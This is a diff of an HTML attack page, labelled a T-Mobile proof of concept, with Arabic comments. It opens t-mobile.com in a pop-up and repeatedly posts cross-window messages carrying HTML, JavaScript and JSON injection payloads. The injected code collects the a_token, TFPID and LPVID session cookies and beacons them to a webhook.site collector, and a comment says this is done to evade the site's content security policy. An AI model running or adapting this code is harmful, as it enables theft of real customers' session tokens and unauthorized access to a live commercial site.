@@ -1,41 +1,70 @@
 <!doctype html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>T-Mobile Exploit - Eval Sink</title>
+    <title>T-Mobile PoC v6 - The Final Attempt</title>
 </head>
 <body style="background: #000; color: #e20074; text-align: center; padding-top: 50px; font-family: monospace;">
 
-    <h1>Critical Vulnerability Found: Eval Sink</h1>
-    <button onclick="pwn()" style="padding: 20px; background: #e20074; color: white; border: none; cursor: pointer;">Execute Attack</button>
-    <div id="status" style="color: #00ff00; margin-top: 20px;"></div>
+    <h1>T-Mobile Security Research (Critical PoC)</h1>
+    <div style="border: 2px solid #e20074; padding: 20px; display: inline-block;">
+        <p>المستهدف: RCE عبر eval() أو script.src</p>
+        <button onclick="pwnTMobile()" style="padding: 15px; background: #e20074; color: #fff; border: none; cursor: pointer; font-weight: bold; font-size: 1.2em;">Pwn T-Mobile</button>
+        <div id="status" style="margin-top: 20px; color: #00ff00; font-size: 1.1em;"></div>
+    </div>
 
 <script>
-    const webh = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
+    // ضع الـ Webhook ID الخاص بك هنا
+    const webhook_id = "3d2d99ff-5472-455e-84e4-64f5035e227f";
+    const webh = "https://webhook.site/506095d4-9a53-4844-a3f2-19f274f7173c" + webhook_id;
 
-    function pwn() {
-        const vic = window.open('https://www.t-mobile.com/', 'victim');
-        document.getElementById('status').innerText = "Target Opened. Triggering Ajax Sync...";
+    function log(msg) { document.getElementById('status').innerText = "> " + msg; }
 
-        // الـ Payload هنا بيحاول يكسر الـ JSON اللي راجع في الـ eval
-        // إحنا بنبعته في الـ action لأن الكود بيجمعه في السلسلة النصية
-        const exploitPayload = {
-            "type": "qm-sync", 
+    function pwnTMobile() {
+        log("فتح نافذة T-Mobile...");
+        const victim = window.open('https://www.t-mobile.com/', 'victim');
+
+        if (!victim) {
+            alert("يرجى تفعيل الـ Pop-ups في المتصفح!");
+            return;
+        }
+
+        // الكود المراد تنفيذه (سحب التوكنات الأساسية)
+        // نستخدم navigator.sendBeacon لتخطي الـ CSP والـ Service Worker
+        const codeToRun = `
+            const keys = ['a_token', 'TFPID', 'LPVID'];
+            const data = document.cookie.split('; ').filter(c => keys.some(k => c.startsWith(k))).join('|');
+            navigator.sendBeacon('${webh}/?eval_pwn=' + btoa(data));
+        `;
+
+        // الـ Payload الهجين: يجرب كسر الـ HTML والـ JSON والـ JS
+        const hybridPayload = {
+            "type": "qm-sync", // جرب تغيير النوع بناءً على ملف الـ JSON المسرب
             "details": {
-                // محاولة حقن كود داخل الـ action اللي هيروح للـ AJAX
-                "action": "createNew'); const k=['a_token','TFPID']; const d=document.cookie.split('; ').filter(c=>k.some(n=>c.startsWith(n))).join('|'); fetch('" + webh + "/?eval_pwn=' + btoa(d)); //",
-                "postParams": "v=1"
+                "account_pwn": `<img src=x onerror="${codeToRun}">`, // حقن HTML (لو الـ Sink هو innerHTML)
+                "toString": `');} catch(e){} ${codeToRun} //`, // كسر JS (لو الـ Sink هو eval الصريح)
+                "json_break": `"}, ${codeToRun}, {"id":"` // كسر JSON (لو الـ Sink هو eval على JSON object)
             }
         };
 
-        let attempts = 0;
+        log("انتظار 15 ثانية لتحميل السكربتات المسؤولة عن الـ Sink...");
+
+        let count = 0;
         const interval = setInterval(() => {
-            attempts++;
-            // إرسال كـ String لضمان دخولها في الـ JSON.parse بتاعهم ومنه للـ Ajax function
-            vic.postMessage(JSON.stringify(exploitPayload), "*");
+            count++;
+            log("إرسال النبضة رقم: " + count);
+
+            // نرسل بصيغة النص لتخطي الـ Clone Error وضمان القبول من JSON.parse
+            victim.postMessage(JSON.stringify(hybridPayload), "*");
             
-            if (attempts > 10) clearInterval(interval);
-        }, 3000);
+            // نرسل بصيغة الكائن احتياطاً
+            try { victim.postMessage(hybridPayload, "*"); } catch(e) {}
+
+            if (count >= 15) {
+                clearInterval(interval);
+                log("انتهت سلسلة الهجوم. افحص الـ Webhook.");
+            }
+        }, 4000); // إرسال رسالة كل 4 ثوانٍ
     }
 </script>
 </body>
